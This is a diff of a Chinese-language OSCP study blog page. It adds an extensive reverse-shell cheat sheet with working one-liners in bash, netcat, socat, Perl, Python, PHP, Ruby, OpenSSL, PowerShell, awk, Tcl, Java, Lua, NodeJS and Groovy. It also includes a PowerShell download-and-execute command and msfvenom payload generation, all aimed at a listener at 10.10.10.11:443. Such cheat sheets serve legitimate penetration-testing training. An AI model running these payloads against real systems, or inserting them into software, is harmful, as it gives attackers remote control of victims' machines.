@@ -357,14 +357,24 @@
                 
 
                 
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-09-02
+                </div>
+                
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.4k
+                    8k
                 </div>
                 
 
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    43 分
+                </div>
                 
 
                 
@@ -787,7 +797,182 @@ systemctl start apache2</code></pre><p>开机自启服务</p>
 <p>注册表中查询密码</p>
 </li>
 </ul>
-<h3 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h3><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h2 id="shells"><a href="#shells" class="headerlink" title="shells"></a>shells</h2><h4 id="网络有效载荷"><a href="#网络有效载荷" class="headerlink" title="网络有效载荷"></a>网络有效载荷</h4><h4 id="脚本有效载荷"><a href="#脚本有效载荷" class="headerlink" title="脚本有效载荷"></a>脚本有效载荷</h4><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>后期攻击是指攻击者在对目标获得某种程度的控制后所执行的操作。</p>
+<h3 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h3><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h2 id="shells"><a href="#shells" class="headerlink" title="shells"></a>shells</h2><h3 id="网络有效载荷"><a href="#网络有效载荷" class="headerlink" title="网络有效载荷"></a>网络有效载荷</h3><h3 id="脚本有效载荷"><a href="#脚本有效载荷" class="headerlink" title="脚本有效载荷"></a>脚本有效载荷</h3><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h3 id="反弹shell方法汇总"><a href="#反弹shell方法汇总" class="headerlink" title="反弹shell方法汇总"></a>反弹shell方法汇总</h3><p>假设本机地址10.10.10.11，监听端口443。</p>
+<h4 id="1、Bash环境下反弹TCP协议shell"><a href="#1、Bash环境下反弹TCP协议shell" class="headerlink" title="1、Bash环境下反弹TCP协议shell"></a>1、Bash环境下反弹TCP协议shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">bash -i &gt;&amp; /dev/tcp/10.10.10.11/443 0&gt;&amp;1</code></pre>
+<pre><code class="bash">/bin/bash -i &gt; /dev/tcp/10.10.10.11/443 0&lt;&amp; 2&gt;&amp;1</code></pre>
+<pre><code class="bash">exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre>
+<pre><code class="bash">exec /bin/sh 0&lt;/dev/tcp/10.10.10.11/443 1&gt;&amp;0 2&gt;&amp;0</code></pre>
+<pre><code class="bash">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre>
+<h4 id="2、Bash环境下反弹UDP协议shell"><a href="#2、Bash环境下反弹UDP协议shell" class="headerlink" title="2、Bash环境下反弹UDP协议shell:"></a>2、Bash环境下反弹UDP协议shell:</h4><p>首先在本地监听UDP协议443端口</p>
+<pre><code class="bash">nc -u -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">sh -i &gt;&amp; /dev/udp/10.10.10.11/443 0&gt;&amp;1</code></pre>
+<h4 id="3、使用Netcat反弹shell"><a href="#3、使用Netcat反弹shell" class="headerlink" title="3、使用Netcat反弹shell"></a>3、使用Netcat反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">nc -e /bin/sh 10.10.10.11 443</code></pre>
+<pre><code class="bash">nc -e /bin/bash 10.10.10.11 443</code></pre>
+<pre><code class="bash">nc -c bash 10.10.10.11 443</code></pre>
+<pre><code class="bash">mknod backpipe p &amp;&amp; nc 10.10.10.11 443 0&lt;backpipe | /bin/bash 1&gt;backpipe </code></pre>
+<pre><code class="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt;/tmp/f</code></pre>
+<pre><code class="bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre>
+<pre><code class="bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt; f</code></pre>
+<pre><code class="bash">rm -f x; mknod x p &amp;&amp; nc 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre>
+<h4 id="4、使用Ncat反弹shell"><a href="#4、使用Ncat反弹shell" class="headerlink" title="4、使用Ncat反弹shell"></a>4、使用Ncat反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">ncat 10.10.10.11 443 -e /bin/bash</code></pre>
+<pre><code class="bash">ncat --udp 10.10.10.11 443 -e /bin/bash</code></pre>
+<h4 id="5、利用Telnet反弹shell"><a href="#5、利用Telnet反弹shell" class="headerlink" title="5、利用Telnet反弹shell"></a>5、利用Telnet反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre>
+<pre><code class="bash">telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444</code></pre>
+<pre><code class="bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 10.10.10.11 443 &gt; f</code></pre>
+<pre><code class="bash">rm -f x; mknod x p &amp;&amp; telnet 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre>
+<h4 id="6、使用Socat反弹shell"><a href="#6、使用Socat反弹shell" class="headerlink" title="6、使用Socat反弹shell"></a>6、使用Socat反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">socat file:`tty`,raw,echo=0 TCP-L:443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre>
+<pre><code class="bash">socat tcp-connect:10.10.10.11:443 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</code></pre>
+<pre><code class="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre>
+<h4 id="7、利用Perl脚本反弹"><a href="#7、利用Perl脚本反弹" class="headerlink" title="7、利用Perl脚本反弹"></a>7、利用Perl脚本反弹</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">perl -e &#39;use Socket;$i=&quot;10.10.10.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre>
+<pre><code class="bash">perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre>
+<p>win平台下执行：</p>
+<pre><code class="bash">perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre>
+<h4 id="8、利用Python脚本反弹shell"><a href="#8、利用Python脚本反弹shell" class="headerlink" title="8、利用Python脚本反弹shell"></a>8、利用Python脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<p>IPv4协议如下：</p>
+<pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
+<pre><code class="bash">export RHOST=&quot;10.10.10.11&quot;;export RPORT=443;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre>
+<pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre>
+<p>IPv6协议如下：</p>
+<pre><code class="bash">python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#39;</code></pre>
+<p>Windows平台如下:</p>
+<pre><code class="bash">C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.10.10.11&#39;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;</code></pre>
+<h4 id="9、利用PHP脚本反弹shell"><a href="#9、利用PHP脚本反弹shell" class="headerlink" title="9、利用PHP脚本反弹shell"></a>9、利用PHP脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">php -r &#39;$sock=fsockopen(&quot;10.10.10.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
+<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;</code></pre>
+<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
+<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</code></pre>
+<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
+<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;</code></pre>
+<pre><code class="bash">php -r &#39;$s=\&#39;127.0.0.1\&#39;;$p=443;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\&#39;/bin/sh$IFS-i\&#39;,array(array(\&#39;pipe\&#39;,\&#39;r\&#39;),array(\&#39;pipe\&#39;,\&#39;w\&#39;),array(\&#39;pipe\&#39;,\&#39;w\&#39;)),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\&#39;connection/closed\&#39;);if(feof($p[1]))die(\&#39;shell/not/response\&#39;);$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(&quot;proc_open/disabled&quot;);}}else{die(&quot;not/connect&quot;);}&#39;</code></pre>
+<h4 id="10、利用Ruby脚本反弹shell"><a href="#10、利用Ruby脚本反弹shell" class="headerlink" title="10、利用Ruby脚本反弹shell"></a>10、利用Ruby脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.10.10.11&quot;,443).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre>
+<pre><code class="bash">ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre>
+<p>Windows平台如下：</p>
+<pre><code class="bash">ruby -rsocket -e &#39;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre>
+<h4 id="11、使用OpenSSL反弹shell"><a href="#11、使用OpenSSL反弹shell" class="headerlink" title="11、使用OpenSSL反弹shell"></a>11、使用OpenSSL反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>
+<pre><code class="bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</code></pre>
+<pre><code class="bash">ncat --ssl -vv -l -p 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.10.10.11:443 &gt; /tmp/s; rm /tmp/s</code></pre>
+<h4 id="12、win平台下使用Powershell反弹shell"><a href="#12、win平台下使用Powershell反弹shell" class="headerlink" title="12、win平台下使用Powershell反弹shell"></a>12、win平台下使用Powershell反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.11&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></pre>
+<pre><code class="bash">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.11&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre>
+<pre><code class="bash">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;)</code></pre>
+<h4 id="13、利用Awk反弹shell"><a href="#13、利用Awk反弹shell" class="headerlink" title="13、利用Awk反弹shell"></a>13、利用Awk反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">awk &#39;BEGIN {s = &quot;/inet/tcp/0/10.10.10.11/443&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre>
+<h4 id="14、TCL脚本反弹shell"><a href="#14、TCL脚本反弹shell" class="headerlink" title="14、TCL脚本反弹shell"></a>14、TCL脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">echo &#39;set s [socket 10.10.10.11 443];while 42 { puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#39; | tclsh</code></pre>
+<h4 id="15、Java版本反弹shell"><a href="#15、Java版本反弹shell" class="headerlink" title="15、Java版本反弹shell"></a>15、Java版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<p>linux平台：</p>
+<pre><code class="java">r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()</code></pre>
+<p>windows平台：</p>
+<pre><code class="java">String host=&quot;127.0.0.1&quot;;
+int port=4444;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
+<p>创建线程：</p>
+<pre><code class="java">Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();</code></pre>
+<h4 id="16、生成War文件反弹shell"><a href="#16、生成War文件反弹shell" class="headerlink" title="16、生成War文件反弹shell"></a>16、生成War文件反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>使用如下命令生成war文件：</p>
+<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war &gt; reverse.war</code></pre>
+<p>查看war包中shell的jsp文件名</p>
+<pre><code class="bash">strings reverse.war | grep jsp</code></pre>
+<p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p>
+<h4 id="17、使用Lua脚本反弹shell"><a href="#17、使用Lua脚本反弹shell" class="headerlink" title="17、使用Lua脚本反弹shell"></a>17、使用Lua脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：<br>Linux平台：</p>
+<pre><code class="bash">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.10.10.11&#39;,&#39;443&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre>
+<p>Windows及Linux平台：</p>
+<pre><code class="bash">lua5.1 -e &#39;local host, port = &quot;10.10.10.11&quot;, 443 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</code></pre>
+<h4 id="18、NodeJS版本反弹shell"><a href="#18、NodeJS版本反弹shell" class="headerlink" title="18、NodeJS版本反弹shell"></a>18、NodeJS版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="js">(function(){
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(443, &quot;10.10.10.11&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; 
+})();</code></pre>
+<pre><code class="js">require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.10.10.11 443&#39;)</code></pre>
+<pre><code class="js">-var x = global.process.mainModule.require
+-x(&#39;child_process&#39;).exec(&#39;nc 10.10.10.11 443 -e /bin/bash&#39;)</code></pre>
+<pre><code class="bash">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</code></pre>
+<h4 id="19、Groovy版本反弹shell"><a href="#19、Groovy版本反弹shell" class="headerlink" title="19、Groovy版本反弹shell"></a>19、Groovy版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">String host=&quot;10.10.10.11&quot;;
+int port=443;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
+<h4 id="20、生成Meterpreter反弹Shell"><a href="#20、生成Meterpreter反弹Shell" class="headerlink" title="20、生成Meterpreter反弹Shell:"></a>20、生成Meterpreter反弹Shell:</h4><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre>
+<pre><code class="bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre>
+<pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre>
+<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre>
+<pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f elf &gt; shell.elf</code></pre>
+<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f exe &gt; shell.exe</code></pre>
+<pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f macho &gt; shell.macho</code></pre>
+<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f asp &gt; shell.asp</code></pre>
+<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.jsp</code></pre>
+<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f war &gt; shell.war</code></pre>
+<pre><code class="bash">msfvenom -p cmd/unix/reverse_python LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.py</code></pre>
+<pre><code class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.sh</code></pre>
+<pre><code class="bash">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.pl</code></pre>
+<h4 id="21、使用Xterm反弹shell"><a href="#21、使用Xterm反弹shell" class="headerlink" title="21、使用Xterm反弹shell"></a>21、使用Xterm反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
+<pre><code class="bash">nc -lvp 443</code></pre>
+<p>然后在靶机上执行如下命令：</p>
+<pre><code class="bash">xterm -display 10.10.10.11:1
+Xnest :1
+xhost +targetip</code></pre>
+<p>参考链接：<br><a href="https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&amp;port=443" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&amp;port=443</a></p>
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>后期攻击是指攻击者在对目标获得某种程度的控制后所执行的操作。</p>
 <ul>
 <li><p>简单的本地Web服务器</p>
 <ul>
@@ -1097,6 +1282,14 @@ cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll 。
 </li>
 </ul>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/Elinpf/OSCP-survival-guide" target="_blank" rel="noopener">https://github.com/Elinpf/OSCP-survival-guide</a></p>
+<h2 id="其他资源参考"><a href="#其他资源参考" class="headerlink" title="其他资源参考"></a>其他资源参考</h2><p><strong>1、反弹shell方法汇总</strong>：<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
